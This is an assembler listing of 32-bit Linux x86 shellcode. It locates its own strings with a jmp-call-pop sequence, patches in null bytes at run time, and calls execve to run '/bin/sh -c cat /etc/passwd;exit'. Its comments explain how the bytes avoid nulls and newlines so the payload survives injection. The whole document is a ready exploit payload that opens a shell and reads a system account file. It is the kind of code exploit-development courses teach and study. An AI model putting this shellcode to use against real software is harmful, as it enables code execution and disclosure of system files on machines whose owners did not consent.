     1                                             bits 32
     2 00000000 90                                 nop
     3 00000001 90                                 nop
     4 00000002 EB29                    start:     jmp short codeEnd
     5 00000004 5E                      start2:    pop esi
     6 00000005 31C0                               xor eax,eax
     7 00000007 884607                             mov [byte esi+flagStr-exeStr-2],al     ; move one null byte to end of /bin/sh (offset is 2 chars. to replace the second-last "X" instead of last "y")
     8 0000000A 88460B                             mov [byte esi+cmdStr-exeStr-1],al      ; move one null byte to end of -c
     9 0000000D 884620                             mov [byte esi+arrayAddr-exeStr-1],al   ; move one null byte to end of shell command
    10 00000010 89462D                             mov [byte esi+arrayAddr-exeStr+12],eax ; move null word to end of array
    11                                             
    12                                             ; Put exeStr into arrayAddr here
    13 00000013 897621                             mov [byte esi+arrayAddr-exeStr],esi
    14                                             
    15                                             ; Put flagStr into arrayAddr here
    16 00000016 8D7E09                             lea edi,[byte esi+flagStr-exeStr]
    17 00000019 897E25                             mov [byte esi+arrayAddr-exeStr+4],edi
    18                                             
    19                                             ; Put cmdStr into arrayAddr here
    20 0000001C 8D7E0C                             lea edi,[byte esi+cmdStr-exeStr]
    21 0000001F 897E29                             mov [byte esi+arrayAddr-exeStr+8],edi
    22                                             
    23 00000022 B00B                               mov al,0x0b
    24 00000024 89F3                               mov ebx,esi
    25 00000026 8D4E21                             lea ecx,[byte esi+arrayAddr-exeStr]
    26 00000029 31D2                               xor edx,edx
    27 0000002B CD80                               int 0x80
    28 0000002D E8D2FFFFFF              codeEnd:   call start2
    29 00000032 2F62696E2F73685879      exeStr:    db "/bin/shXy" ; "y" is added To avoid 0x0A (newline) as offset
    30 0000003B 2D6358                  flagStr:   db "-cX"
    31 0000003E 636174202F6574632F-     cmdStr:    db "cat /etc/passwd;exitX"
    32 00000047 7061737377643B6578-
    33 00000050 697458             
    34 00000053 FFFFFFFF                arrayAddr: dd 0xffffffff
    35 00000057 FFFFFFFF                           dd 0xffffffff
    36 0000005B FFFFFFFF                           dd 0xffffffff
    37 0000005F FFFFFFFF                           dd 0xffffffff
    38 00000063 61000000                newAddr:   dd newAddr-start
